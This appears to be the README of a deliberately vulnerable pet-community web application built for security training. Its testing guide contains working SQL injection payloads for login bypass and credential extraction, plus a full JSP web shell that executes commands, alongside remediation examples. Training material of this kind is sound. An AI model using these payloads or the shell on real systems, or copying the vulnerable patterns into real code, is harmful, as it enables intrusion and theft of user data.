# 🐾 Pet Community - Vulnerable Web Application

## ⚠️ SECURITY WARNING
**This application contains intentional security vulnerabilities for educational purposes only. DO NOT deploy this application in a production environment.**

## 📋 Overview
Pet Community is a deliberately vulnerable web application designed for security testing and education. It simulates a typical community website where users can share posts about their pets, comment on posts, and interact with each other.

### Key Features
- User registration and authentication
- Post creation with image uploads
- Comment and reply system
- Admin panel for user management
- Search functionality

### Intentional Vulnerabilities
- **SQL Injection** - Multiple injection points in authentication and search
- **File Upload Vulnerabilities** - Unrestricted file upload with web shell potential
- **Insecure Direct Object References** - Missing access controls
- **Weak Session Management** - Basic session handling
- **Information Disclosure** - Verbose error messages and debug information

## 🛠️ Prerequisites

### System Requirements
- **Java JDK 17** or higher
- **MySQL 8.0** or higher
- **Maven** (optional - mvnw wrapper included)

### Operating System Notes
- **Windows**: No additional Maven installation required (uses included `mvnw.cmd`)
- **Linux/macOS**: May need to install Maven separately or use included `mvnw` script

## 🚀 Installation & Setup

### 1. Clone Repository
```bash
git clone https://github.com/your-username/pet-community.git
cd pet-community
```

### 2. Database Setup

#### Create Database and User
Connect to MySQL as root with UTF-8 support:
```bash
mysql -u root -p --default-character-set=utf8mb4
```

Execute the following SQL commands:
```sql
CREATE DATABASE pet_community CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;
CREATE USER 'petuser'@'localhost' IDENTIFIED BY 'Pa$$w0rd';
GRANT ALL PRIVILEGES ON pet_community.* TO 'petuser'@'localhost';
FLUSH PRIVILEGES;
USE pet_community;
```

#### Initialize Database Schema
Run the initialization script:
```bash
mysql -u petuser -p --default-character-set=utf8mb4 pet_community < database/init.sql
```

### 3. Build and Run Application

#### Windows
```cmd
.\mvnw.cmd clean install
.\mvnw.cmd spring-boot:run
```

#### Linux/macOS
```bash
chmod +x mvnw
./mvnw clean install
./mvnw spring-boot:run
```

### 4. Access Application
- **Application URL**: http://localhost:8080
- **Default Admin Account**: 
  - Email: `admin@petcommunity.com`
  - Password: `admin123`

## 🧪 Security Testing Guide

### SQL Injection Testing

#### 1. Authentication Bypass
Navigate to the login page and test SQL injection:

**Login Page** (`/login`)
- **Email Field**: `admin@petcommunity.com' OR '1'='1' --`
- **Password Field**: `anything`

Alternative payloads:
- `' OR 1=1 LIMIT 1 #`
- `' OR '1'='1' #`

#### 2. Search-based SQL Injection
After logging in with any account, use the post search functionality:

**Step 1: Database Information Gathering**
```sql
%' UNION SELECT 1, 'DB INFO', CONCAT('Database: ', DATABASE()), 1, 0, NOW(), 'INFO', USER(), VERSION() #
```

**Step 2: Table Enumeration**
```sql
%' UNION SELECT 1, 'TABLES', table_name, 1, 0, NOW(), 'ENUM', 'SYSTEM', 'INFO' FROM information_schema.tables WHERE table_schema=DATABASE() #
```

**Step 3: Column Information**
```sql
%' UNION SELECT 1, 'COLUMNS', CONCAT(column_name, ' (', data_type, ')'), 1, 0, NOW(), 'SCHEMA', 'SYSTEM', 'INFO' FROM information_schema.columns WHERE table_name='users' AND table_schema=DATABASE() #
```

**Step 4: Extract Admin Credentials**
```sql
%' UNION SELECT id, CONCAT('ADMIN: ', nickname), CONCAT('Email: ', email, ' | Password: ', password), id, 999, created_at, 'EXPOSED', name, role FROM users WHERE role='ADMIN' #
```

Alternative admin extraction:
```sql
%' UNION SELECT id, nickname, CONCAT('Email: ', email), name, 0, created_at, CONCAT('PWD: ', password), role, 'EXPOSED' FROM users WHERE role='ADMIN' #
```

**Step 5: Extract All User Data**
```sql
%' UNION SELECT id, CONCAT('USER: ', nickname), CONCAT(email, ' | PWD: ', password), id, 0, created_at, role, name, 'LEAKED' FROM users #
```

### File Upload Vulnerabilities

#### Testing Web Shell Upload
1. Navigate to **Create Post** (`/posts/new`)
2. Upload files with various extensions:
   - `.jsp` - Java Server Pages
   - `.php` - PHP scripts
   - `.asp` - ASP scripts
   - `.js` - JavaScript files

#### Example Web Shell (JSP)
Create a file named `shell.jsp`:
```jsp
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    java.io.BufferedReader br = new java.io.BufferedReader(
        new java.io.InputStreamReader(p.getInputStream()));
    String line;
    while((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>
<form>
Command: <input type="text" name="cmd">
<input type="submit" value="Execute">
</form>
```

#### Access Uploaded Files
Uploaded files are accessible at: `http://localhost:8080/uploads/{filename}`

## 📊 Database Schema

### Users Table
| Column | Type | Description |
|--------|------|-------------|
| id | BIGINT | Primary key |
| name | VARCHAR(100) | Full name |
| nickname | VARCHAR(50) | Display name |
| email | VARCHAR(100) | Email (unique) |
| password | VARCHAR(255) | Plain text password |
| role | VARCHAR(20) | USER/ADMIN |
| created_at | TIMESTAMP | Creation time |
| updated_at | TIMESTAMP | Last update |

### Posts Table
| Column | Type | Description |
|--------|------|-------------|
| id | BIGINT | Primary key |
| title | VARCHAR(200) | Post title |
| content | TEXT | Post content |
| image_path | VARCHAR(500) | Uploaded image path |
| user_id | BIGINT | Author ID |
| view_count | INT | View counter |
| created_at | TIMESTAMP | Creation time |
| updated_at | TIMESTAMP | Last update |

### Comments Table
| Column | Type | Description |
|--------|------|-------------|
| id | BIGINT | Primary key |
| content | TEXT | Comment content |
| post_id | BIGINT | Associated post |
| user_id | BIGINT | Author ID |
| parent_comment_id | BIGINT | Parent comment (for replies) |
| created_at | TIMESTAMP | Creation time |

## 🎯 Learning Objectives

### For Security Professionals
- Practice SQL injection techniques
- Understand file upload vulnerabilities
- Experience common web application vulnerabilities

### For Developers
- See common coding mistakes
- Understand secure coding practices
- Learn input validation importance
- Practice vulnerability remediation

## 🔒 Security Remediation Guide

### SQL Injection Prevention
```java
// Vulnerable code
String sql = "SELECT * FROM users WHERE email = '" + email + "'";

// Secure code
String sql = "SELECT * FROM users WHERE email = ?";
PreparedStatement stmt = connection.prepareStatement(sql);
stmt.setString(1, email);
```

### File Upload Security
```java
// Add file type validation
private static final Set<String> ALLOWED_EXTENSIONS = 
    Set.of(".jpg", ".jpeg", ".png", ".gif");

// Validate MIME type
private static final Set<String> ALLOWED_MIME_TYPES = 
    Set.of("image/jpeg", "image/png", "image/gif");

// Store outside web root
private static final String UPLOAD_DIR = "/secure/uploads/";
```

## ⚠️ Important Notes

### Legal Disclaimer
- This application is for educational purposes only
- Only test on systems you own or have explicit permission to test
- Do not use for malicious purposes
- Follow responsible disclosure practices

### Troubleshooting

#### Common Issues
1. **Character encoding problems**: Ensure MySQL connection uses UTF-8
2. **Port conflicts**: Change server port in `application.yml`
3. **Permission denied**: Check file upload directory permissions
4. **Database connection**: Verify MySQL service is running

#### Debug Information
The application includes verbose logging and error messages for educational purposes. In production, these should be removed.


## 📄 License

This project is licensed under the Eclipse Public License v2.0 - see the [LICENSE](LICENSE) file for details.

---

**Remember: This is an intentionally vulnerable application. Never deploy in production!**